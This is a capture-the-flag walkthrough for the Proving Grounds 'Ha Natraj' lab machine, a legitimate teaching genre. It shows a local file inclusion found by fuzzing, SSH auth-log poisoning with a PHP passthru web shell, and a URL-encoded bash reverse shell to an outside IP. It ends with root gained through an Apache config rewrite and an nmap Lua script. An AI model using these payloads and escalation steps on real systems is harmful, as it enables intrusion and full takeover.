---
layout: default
title: Ha Natraj
parent: Proving Grounds - Linux
nav_order: 3
---

# Ha Natraj

---

## Host Info

- _OS_: Linux
- _IP_: 192.168.202.80

## Discovered Ports for Enumeration

- _22_ - SSH
- _80_ - http

## Users and Credentials

- _Users_: natraj, mahakal
- _Credentials_:

# Scanning (Nmap)

---

```bash
sudo nmap -Pn -p- -sC -sV -T4 -vv --open 192.168.202.80
```

# Enumeration

---

## 80 - HTTP

### Wfuzz

Returns the directory _/console_

![wfuzz](../../../assets/images/ctfs/proving_grounds/ha_natraj/wfuzz.png)

_/console_ contains _file.php_ which is empty

Use wfuzz to fuzz a parameter and test for LFI.

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0 "http://192.168.202.80/console/file.php?FUZZ=../../../../../../../etc/passwd"
```

![fuzz_lfi](../../../assets/images/ctfs/proving_grounds/ha_natraj/fuzz_lfi.png)

This reveals the parameter _file_.

Confirm LFI vulnerability by displaying _/etc/passwd_

![etc_passwd](../../../assets/images/ctfs/proving_grounds/ha_natraj/etc_passwd.png)

Users: natraj and mahakal
{: .warn }

# Exploitation

---

## SSH Auth Log Poisoning

Check if _/var/log/auth.log_ is visible.

```bash
URL: http://192.168.202.80/console/file.php?file=../../../../../../../var/log/auth.log
```

![ssh_log](../../../assets/images/ctfs/proving_grounds/ha_natraj/ssh_log.png)

Process for testing SSH auth log poisoning and RCE:

1. Netcat verbose to the target on port 22
2. Send malicious php code
3. Verify SSH auth log poisoning successful
4. Execute RCE with PHP cmd shell via poisoned log

Send PHP cmd shell through SSH via Netcat.

```bash
# netcat verbose to target on port 22
nc -nv 192.168.202.80 22

# send malicious php code
pwn_code/<?php passthru($_GET['cmd']); ?>
```

Verify SSH auth log is poisoned.

![ssh_poison](../../../assets/images/ctfs/proving_grounds/ha_natraj/ssh_poison.png)

Execute RCE with PHP cmd shell via poisoned log.

```bash
URL: http://192.168.202.80/console/file.php?file=../../../../../../../var/log/auth.log&cmd=id
```

![cmd_rce](../../../assets/images/ctfs/proving_grounds/ha_natraj/cmd_rce.png)

Get reverse shell with URL encoded bash one-liner

```bash
URL: 192.168.202.80/console/file.php?file=../../../../../../../var/log/auth.log&cmd=bash -c "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F9001%200%3E%261"
```

![rev_shell](../../../assets/images/ctfs/proving_grounds/ha_natraj/rev_shell.png)

# Post-Exploitation

---

## Spawn TTY Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty size
stty raw -echo
fg
stty rows <first_value>
stty cols <second_value>
export TERM=xterm-256color
```

## Check SUDO Permissions

```bash
sudo -l
```

![sudo_l](../../../assets/images/ctfs/proving_grounds/ha_natraj/sudo_l.png)

We can exploit this to change the apache2.conf file to run as user 'mahakal' instead of 'www-data'.

If we restart Apache after doing this we will lose our shell, but when we regain our reverse shell connection we will be logged on as 'mahakal' instead of 'www-data'

```bash
# make a copy of apache2.conf and place in /var/tmp
cd /var/tmp
cp /etc/apache2/apache2.conf .

# Use sed to find the 'user' environment variable and replace with 'mahakal'
sed -i 's/User ${APACHE_RUN_USER}/User mahakal/g' apache2.conf

# Use sed to find the 'group' environment variable and replace with 'mahakal'
sed -i 's/Group ${APACHE_RUN_GROUP}/Group mahakal/g' apache2.conf

# Replace apache2.conf with the newly edited version
cp apache2.conf /etc/apache2/apache2.conf
```

Restart the Apache2 service.

```bash
sudo /bin/systemctl restart apache2
```

Regain our shell...

```bash
http://192.168.202.80/console/file.php?file=../../../../../../../var/log/auth.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F9001%200%3E%261%22
```

## Check Sudo Permissions for 'mahakal'

We are now logged on as _mahakal_ and can check this account's sudo permissions.

![mahakal_sudo](../../../assets/images/ctfs/proving_grounds/ha_natraj/mahakal_sudo.png)

If we create a binary in _/dev/shm_ and execute this with _nmap_ and the _--script_ flag will will have a root shell.

```bash
cd /dev/shm
echo 'os.execute("/bin/bash")' > rootshell
sudo /usr/bin/nmap --script=rootshell
```

![root](../../../assets/images/ctfs/proving_grounds/ha_natraj/root.png)
